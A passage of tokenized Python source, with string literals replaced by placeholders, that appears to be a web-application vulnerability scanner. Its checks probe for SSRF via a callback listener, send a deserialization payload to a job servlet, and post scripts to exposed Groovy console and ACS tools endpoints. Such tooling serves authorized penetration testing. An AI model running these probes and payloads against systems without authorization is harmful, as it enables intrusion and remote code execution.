u	=	base64	.	b16decode	(	d	.	get	(	"str"	)	[	0	]	)	.	decode	(	)	
f	=	Finding	(	"str"	,	u	,	
"str"	
"str"	)	

results	.	append	(	f	)	

return	results	


@register	
def	ssrf_autoprovisioning_servlet	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
global	token	,	d	

results	=	[	]	

AUTOPROVISIONING1	=	itertools	.	product	(	
(	
"str"	,	
"str"	
)	,	
(	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	
)	
)	
AUTOPROVISIONING1	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	AUTOPROVISIONING1	)	

AUTOPROVISIONING2	=	itertools	.	product	(	
(	
"str"	,	
"str"	
)	,	
(	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	
)	
)	
cache_buster	=	random_string	(	)	
AUTOPROVISIONING2	=	list	(	"str"	.	format	(	p1	,	p2	.	format	(	cache_buster	)	)	for	p1	,	p2	in	AUTOPROVISIONING2	)	


AUTOPROVISIONING3	=	itertools	.	product	(	
(	
"str"	,	
"str"	
)	,	
(	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	
)	
)	
cache_buster	=	randint	(	1	,	2	*	*	12	)	
AUTOPROVISIONING3	=	list	(	"str"	.	format	(	p1	,	p2	.	format	(	cache_buster	)	)	for	p1	,	p2	in	AUTOPROVISIONING3	)	

for	path	in	itertools	.	chain	(	AUTOPROVISIONING1	,	AUTOPROVISIONING2	,	AUTOPROVISIONING3	)	:	
url	=	normalize_url	(	base_url	,	path	)	
enc_orig_url	=	(	base64	.	b16encode	(	url	.	encode	(	)	)	)	.	decode	(	)	
back_url	=	"str"	.	format	(	my_host	,	token	,	enc_orig_url	)	

data	=	"str"	
data	=	data	.	format	(	back_url	)	
headers	=	{	"str"	:	"str"	,	"str"	:	base_url	}	

try	:	
http_request	(	url	,	"str"	,	data	=	data	,	additional_headers	=	headers	,	proxy	=	proxy	,	debug	=	debug	)	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

time	.	sleep	(	10	)	

if	"str"	in	d	:	
u	=	base64	.	b16decode	(	d	.	get	(	"str"	)	[	0	]	)	.	decode	(	)	
f	=	Finding	(	"str"	,	u	,	
"str"	
"str"	)	

results	.	append	(	f	)	

return	results	


@register	
def	ssrf_opensocial_proxy	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
global	token	,	d	

results	=	[	]	

OPENSOCIAL1	=	itertools	.	product	(	
(	
"str"	,	
"str"	
)	,	
(	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	
)	
)	
OPENSOCIAL1	=	list	(	pair	[	0	]	.	format	(	pair	[	1	]	)	for	pair	in	OPENSOCIAL1	)	

OPENSOCIAL2	=	itertools	.	product	(	
(	
"str"	,	
"str"	
)	,	
(	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	
)	
)	
cache_buster	=	random_string	(	)	
OPENSOCIAL2	=	list	(	pair	[	0	]	.	format	(	pair	[	1	]	.	format	(	cache_buster	)	)	for	pair	in	OPENSOCIAL2	)	

OPENSOCIAL3	=	itertools	.	product	(	
(	
"str"	,	
"str"	
)	,	
(	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	
)	
)	
cache_buster	=	randint	(	1	,	2	*	*	12	)	
OPENSOCIAL3	=	list	(	pair	[	0	]	.	format	(	pair	[	1	]	.	format	(	cache_buster	)	)	for	pair	in	OPENSOCIAL3	)	

for	path	in	itertools	.	chain	(	OPENSOCIAL1	,	OPENSOCIAL2	,	OPENSOCIAL3	)	:	
url	=	normalize_url	(	base_url	,	path	)	
encoded_orig_url	=	(	base64	.	b16encode	(	url	.	encode	(	)	)	)	.	decode	(	)	
back_url	=	"str"	.	format	(	my_host	,	token	,	encoded_orig_url	)	
url	=	url	.	format	(	back_url	)	

try	:	
http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

time	.	sleep	(	10	)	

if	"str"	in	d	:	
u	=	base64	.	b16decode	(	d	.	get	(	"str"	)	[	0	]	)	.	decode	(	)	
f	=	Finding	(	"str"	,	u	,	
"str"	
"str"	)	

results	.	append	(	f	)	

return	results	


@register	
def	ssrf_opensocial_makeRequest	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
global	token	,	d	

results	=	[	]	

MAKEREQUEST1	=	itertools	.	product	(	
(	
"str"	,	
"str"	
)	,	
(	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	
)	
)	
MAKEREQUEST1	=	list	(	pair	[	0	]	.	format	(	pair	[	1	]	)	for	pair	in	MAKEREQUEST1	)	

MAKEREQUEST2	=	itertools	.	product	(	
(	
"str"	,	
"str"	
)	,	
(	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	
)	
)	
cache_buster	=	random_string	(	)	
MAKEREQUEST2	=	list	(	pair	[	0	]	.	format	(	pair	[	1	]	.	format	(	cache_buster	)	)	for	pair	in	MAKEREQUEST2	)	

MAKEREQUEST3	=	itertools	.	product	(	
(	
"str"	,	
"str"	
)	,	
(	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	
)	
)	
cache_buster	=	randint	(	1	,	2	*	*	12	)	
MAKEREQUEST3	=	list	(	pair	[	0	]	.	format	(	pair	[	1	]	.	format	(	cache_buster	)	)	for	pair	in	MAKEREQUEST3	)	

for	path	in	itertools	.	chain	(	MAKEREQUEST1	,	MAKEREQUEST2	,	MAKEREQUEST3	)	:	
url	=	normalize_url	(	base_url	,	path	)	
encoded_orig_url	=	(	base64	.	b16encode	(	url	.	encode	(	)	)	)	.	decode	(	)	
back_url	=	"str"	.	format	(	my_host	,	token	,	encoded_orig_url	)	
url	=	url	.	format	(	back_url	)	

try	:	
headers	=	{	"str"	:	"str"	,	"str"	:	base_url	}	
data	=	"str"	
http_request	(	url	,	"str"	,	data	=	data	,	additional_headers	=	headers	,	proxy	=	proxy	,	debug	=	debug	)	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

time	.	sleep	(	10	)	

if	"str"	in	d	:	
u	=	base64	.	b16decode	(	d	.	get	(	"str"	)	[	0	]	)	.	decode	(	)	
f	=	Finding	(	"str"	,	u	,	
"str"	)	

results	.	append	(	f	)	

return	results	


@register	
def	swf_xss	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
SWFS	=	(	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	,	
"str"	
)	

results	=	[	]	
for	path	in	SWFS	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	

ct	=	content_type	(	resp	.	headers	.	get	(	"str"	,	"str"	)	)	
cd	=	resp	.	headers	.	get	(	"str"	,	"str"	)	
if	resp	.	status_code	==	200	and	ct	==	"str"	and	not	cd	:	
f	=	Finding	(	"str"	,	url	,	
"str"	
"str"	)	

results	.	append	(	f	)	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	deser_externaljob_servlet	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
DESERPAYLOAD	=	base64	.	b64decode	(	"str"	)	

EXTERNALJOBSERVLET	=	itertools	.	product	(	(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	)	)	
EXTERNALJOBSERVLET	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	EXTERNALJOBSERVLET	)	


results	=	[	]	
for	path	in	EXTERNALJOBSERVLET	:	
url	=	normalize_url	(	base_url	,	path	)	
data	=	{	"str"	:	(	"str"	,	"str"	)	,	"str"	:	(	"str"	,	DESERPAYLOAD	,	"str"	)	}	
headers	=	{	"str"	:	base_url	}	
try	:	
resp	=	http_request_multipart	(	url	,	data	=	data	,	additional_headers	=	headers	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	500	and	"str"	in	str	(	resp	.	content	)	:	
f	=	Finding	(	"str"	,	url	,	
"str"	
"str"	)	

results	.	append	(	f	)	
break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_webdav	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
WEBDAV	=	itertools	.	product	(	(	"str"	,	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	)	)	
WEBDAV	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	WEBDAV	)	

results	=	[	]	
for	path	in	WEBDAV	:	
try	:	
url	=	normalize_url	(	base_url	,	path	)	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	
www_authenticate	=	resp	.	headers	.	get	(	"str"	,	"str"	)	.	lower	(	)	
if	resp	.	status_code	==	401	and	"str"	in	www_authenticate	:	
f	=	Finding	(	"str"	,	url	,	
"str"	
"str"	)	

results	.	append	(	f	)	

break	

except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_groovy_console	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
SCRIPT	=	"str"	

GROOVYSCRIPT1	=	itertools	.	product	(	
(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	)	
)	
GROOVYSCRIPT1	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	GROOVYSCRIPT1	)	

GROOVYSCRIPT2	=	itertools	.	product	(	
(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	)	
)	
GROOVYSCRIPT2	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	GROOVYSCRIPT2	)	

GROOVYAUDIT	=	itertools	.	product	(	
(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	)	
)	
GROOVYAUDIT	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	GROOVYAUDIT	)	

results	=	[	]	
for	path	in	itertools	.	chain	(	GROOVYSCRIPT1	,	GROOVYSCRIPT2	)	:	
url	=	normalize_url	(	base_url	,	path	)	
data	=	"str"	.	format	(	SCRIPT	)	
headers	=	{	"str"	:	"str"	,	"str"	:	base_url	}	
try	:	
resp	=	http_request	(	url	,	"str"	,	data	=	data	,	additional_headers	=	headers	,	proxy	=	proxy	,	debug	=	debug	)	

f	=	Finding	(	"str"	,	url	,	"str"	
"str"	)	

if	resp	.	status_code	==	200	:	
if	"str"	in	str	(	resp	.	content	)	:	
results	.	append	(	f	)	
break	

try	:	
json	.	loads	(	resp	.	content	.	decode	(	)	)	[	"str"	]	
except	:	
pass	
else	:	
results	.	append	(	f	)	
break	

except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

for	path	in	GROOVYAUDIT	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	:	
try	:	
json	.	loads	(	resp	.	content	.	decode	(	)	)	[	"str"	]	
except	:	
pass	
else	:	
f	=	Finding	(	"str"	,	url	,	"str"	
"str"	)	

results	.	append	(	f	)	
break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


@register	
def	exposed_acs_tools	(	base_url	,	my_host	,	debug	=	False	,	proxy	=	None	)	:	
DATA	=	"str"	

FIDDLE	=	itertools	.	product	(	
(	"str"	,	"str"	)	,	
(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	)	
)	
FIDDLE	=	list	(	"str"	.	format	(	p1	,	p2	)	for	p1	,	p2	in	FIDDLE	)	

PREDICATES	=	(	"str"	,	)	

results	=	[	]	
for	path	in	FIDDLE	:	
url	=	normalize_url	(	base_url	,	path	)	
headers	=	{	"str"	:	"str"	,	"str"	:	base_url	,	"str"	:	"str"	}	
try	:	
resp	=	http_request	(	url	,	"str"	,	data	=	DATA	,	additional_headers	=	headers	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	and	"str"	in	str	(	resp	.	content	)	:	
f	=	Finding	(	"str"	,	url	,	"str"	
"str"	)	

results	.	append	(	f	)	
break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

for	path	in	PREDICATES	:	
url	=	normalize_url	(	base_url	,	path	)	
try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	,	debug	=	debug	)	

if	resp	.	status_code	==	200	and	"str"	in	str	(	resp	.	content	)	:	
f	=	Finding	(	"str"	,	url	,	"str"	
"str"	)	

results	.	append	(	f	)	
break	
except	:	
if	debug	:	
error	(	"str"	,	check	=	"str"	,	url	=	url	)	

return	results	


def	parse_args	(	)	:	
parser	=	argparse	.	ArgumentParser	(	description	=	"str"	)	

parser	.	add_argument	(	"str"	,	"str"	,	help	=	"str"	)	
parser	.	add_argument	(	"str"	,	help	=	"str"	)	
parser	.	add_argument	(	"str"	,	action	=	"str"	,	help	=	"str"	)	
parser	.	add_argument	(	"str"	,	help	=	"str"	)	
parser	.	add_argument	(	"str"	,	type	=	int	,	default	=	80	,	help	=	"str"	)	
parser	.	add_argument	(	"str"	,	type	=	int	,	default	=	3	,	help	=	"str"	)	
parser	.	add_argument	(	"str"	,	"str"	,	nargs	=	"str"	,	help	=	"str"	)	

return	parser	.	parse_args	(	sys	.	argv	[	1	:	]	)	


def	run_detector	(	port	)	:	
global	token	,	d	

handler	=	lambda	*	args	:	Detector	(	token	,	d	,	*	args	)	
httpd	=	HTTPServer	(	(	"str"	,	port	)	,	handler	)	

t	=	Thread	(	target	=	httpd	.	serve_forever	)	
t	.	start	(	)	

return	httpd	


def	main	(	)	:	
global	extra_headers	

args	=	parse_args	(	)	

if	args	.	proxy	:	
p	=	args	.	proxy	
proxy	=	{	"str"	:	p	,	"str"	:	p	}	
else	:	
proxy	=	{	}	

if	args	.	header	:	
for	header	in	args	.	header	:	
header_data	=	header	.	split	(	"str"	)	
extra_headers	[	header_data	[	0	]	.	strip	(	)	]	=	header_data	[	1	]	.	strip	(	)	
else	:	
extra_headers	=	{	}	

if	not	args	.	url	:	
print	(	"str"	)	
sys	.	exit	(	1337	)	

if	not	args	.	host	:	
print	(	"str"	)	
sys	.	exit	(	1337	)	

if	not	preflight	(	args	.	url	,	proxy	)	:	
print	(	"str"	)	
sys	.	exit	(	1337	)	

httpd	=	run_detector	(	args	.	port	)	

with	concurrent	.	futures	.	ThreadPoolExecutor	(	args	.	workers	)	as	tpe	:	
futures	=	[	]	
for	check	in	registered	:	
my_host	=	"str"	.	format	(	args	.	host	,	args	.	port	)	
futures	.	append	(	tpe	.	submit	(	check	,	args	.	url	,	my_host	,	args	.	debug	,	proxy	)	)	

for	future	in	concurrent	.	futures	.	as_completed	(	futures	)	:	
for	finding	in	future	.	result	(	)	:	
print	(	"str"	)	
print	(	"str"	.	format	(	finding	.	name	)	)	
print	(	"str"	.	format	(	finding	.	url	)	)	
print	(	"str"	.	format	(	finding	.	description	)	)	

httpd	.	shutdown	(	)	


if	__name__	==	"str"	:	
main	(	)	
	